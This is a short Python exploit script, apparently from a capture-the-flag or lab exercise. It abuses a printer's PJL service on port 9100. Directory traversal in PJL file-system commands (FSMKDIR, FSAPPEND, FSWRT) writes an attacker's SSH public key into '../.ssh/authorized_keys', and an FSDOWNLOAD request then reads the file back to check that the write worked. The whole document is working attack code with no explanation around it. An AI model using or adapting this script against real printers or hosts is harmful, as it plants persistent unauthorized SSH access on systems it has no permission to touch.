#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)

cmds = [
    f'@PJL FSAPPEND OFFSET=0 SIZE={N} NAME="{PATH}"\r\n'.encode() + KEY,
    f'@PJL FSWRT OFFSET=0 SIZE={N} NAME="{PATH}"\r\n'.encode() + KEY,
    f'@PJL FSAPPEND NAME="{PATH}" SIZE={N}\r\n'.encode() + KEY,
]

s = socket.socket()
s.settimeout(3)
s.connect(("127.0.0.1", 9100))
s.sendall(b'@PJL FSMKDIR NAME="../.ssh"\r\n')
try:
    print("mkdir", s.recv(256))
except socket.timeout:
    pass
s.close()

for i, payload in enumerate(cmds):
    s = socket.socket()
    s.settimeout(8)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    try:
        r = s.recv(512)
    except socket.timeout:
        r = b"T"
    s.close()
    print(i, repr(r[:100]))
    s = socket.socket()
    s.settimeout(5)
    s.connect(("127.0.0.1", 9100))
    s.sendall(f'@PJL FSDOWNLOAD NAME="{PATH}" SIZE={N}\r\n'.encode())
    try:
        dl = s.recv(1024)
    except socket.timeout:
        dl = b"T"
    s.close()
    print("dl", dl[:100])